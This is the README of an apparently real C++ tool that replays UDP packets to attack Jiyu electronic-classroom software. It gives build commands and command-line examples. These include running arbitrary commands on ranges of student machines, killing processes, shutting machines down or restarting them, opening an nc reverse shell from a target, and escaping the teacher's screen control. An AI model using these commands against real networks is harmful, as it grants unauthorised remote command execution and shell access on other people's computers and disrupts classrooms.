# Jiyu-UDP-Attack-Cpp
使用 C++ 编写的 UDP 重放攻击脚本，用于极域电子教室。

English document: [README.md](https://github.com/pbw-Kevin/Jiyu-UDP-Attack-Cpp/blob/main/README.md)

## 编译
要求的 C++ 版本：C++14

编译命令：

### MSVC
```bash
cl main.cpp /std:c++14 /Fe:main.exe
```

### GCC / MinGW (On Windows)
```bash
g++ main.cpp -o main.exe -std=c++14 -lws2_32
```

### GCC / MinGW (On Linux)
```bash
g++ main.cpp -o main -std=c++14
```

当在 Windows 平台上使用 GCC / MinGW 编译器时注意：  
确保在引用库的搜索目录中包含了 Windows 相关的程序库。  
不要忘记添加编译参数 `-lws2_32`。如果不使用命令行编译，请在 IDE 的编译选项中加入相应参数。

## 使用方法
通过运行程序或调用如下命令启用用户界面：
```bash
main
```

或者使用命令行调用：
```bash
main [-h(--help) |
  [-ip <IP>] [-p <Port>] [-msg <Message> | -c <Command>]
  [-l <Loop Count>] [-t <Loop Time Interval>]
  [-e <Extra Option>] [-ncport <NC Port>]]
```

参数列表：
| 参数 | 描述 | 默认值 |
| -------- | ----------- | ------- |
| `-h(--help)` | 显示帮助文本。 | |
| `-ip <IP>` | 指定目标机的 IP。 | |
| `-p <Port>` | 指定监听的端口。 | 4705 |
| `-msg <Message>` | 指定要发送的信息。 | |
| `-c <Command>` | 在目标机上运行指定命令。 | |
| `-e <Extra Option>` | 加载额外选项。 | |
| `-l <Loop Count>` | 指定命令的循环次数。 | 1
| `-c <Loop Time Interval>` | 指定两次循环直接的时间间隔，单位为秒。 | 22 |
| `-ncport <NC Port>` | 指定 `nc` 命令的监听端口。 | 8888 |

在 `-e` 参数的 `<Extra Option>` 选项中，可用的选项有：
| 选项 | 描述 |
| ------ | ----------- |
| `r` | 重启目标机 |
| `s` | 关闭目标机 |
| `g` | 获取当前的 IP 地址和学生端监听的端口。 |
| `nc` | 反弹 Shell。目标机需要能访问互联网。在退出时可使用 `exit` 命令。 |
| `break` | 脱离屏幕控制。需要以管理员身份运行程序。 |
| `continue` | 恢复屏幕控制。 |

在 `-ip` 参数的 `<IP>` 中，可用的 IP 有：
- 一个独立的 IP。例子： `192.168.1.1`
- 一个 IP 段，以 `/24` 结尾。例子：`1892.168.1.1/24`
- 一个 IP 段，用 `-` 表示。例子： `192.168.1.2-10`  
注意：  
只有 IP 的最后一个数字可以成段。  
这是非法的： `192.168.1-80.1`

### 命令例子
1. 获取当前的 IP 地址和学生端监听的端口

```bash  
main -e g
```

2. 脱离屏幕控制

需要管理员权限，主要为了 MpsSvc。
```bash
main -e break
```

3. 恢复屏幕控制

```bash
main -e continue
```

4. 发送消息

给 IP 为 `192.168.1.1` 的目标机发送消息“Hello!”：
```bash
main -ip 192.168.1.1 -msg "Hello!"
```

如果学生端监听的端口是 **4605**，使用参数 `-p <Port>` 来指定端口号。向 IP 为 `192.168.1.12` 的目标机发送消息“Hello!”：
```bash
main -ip 192.168.1.12 -p 4605 -msg "Hello!"
```

5. 运行命令

在 IP 为 `192.168.1.12` 到 `192.168.1.137` 的目标机上弹出计算器：
```bash
main -ip 192.168.1.12-137 -c calc.exe
```

如果要运行的命令中含有空格，使用引号包裹：
```bash
main -ip 192.168.1.1 -c "taskkill /f /im chrome.exe"
```

6. 反弹 Shell

目标机的 IP 应当为**某个IP**，不能批量反弹，且目标机需要能访问互联网。
```bash
main -ip 192.168.1.1 -e nc
```

7. 关机重启

关机：
```bash
main 192.168.1.1 -e s
```

重启：
```bash
main 192.168.1.1 -e r
```

8. 循环执行

向 IP 为 `192.168.1.0` 到 `192.168.1.255` 的目标机发送消息“Hello!”，总共 3 次，每两次之间间隔 50 秒：
```bash
main -ip 192.168.1.1/24 -msg "Hello!" -l 3 -t 50
```

## 关于
受到了 [ht0Ruial/Jiyu_udp_attack](https://github.com/ht0Ruial/Jiyu_udp_attack) 项目的启发，于是用 C++ 重写了一个。

## 许可证
[MIT 许可证](https://github.com/pbw-Kevin/Jiyu-UDP-Attack-Cpp/blob/main/LICENSE)
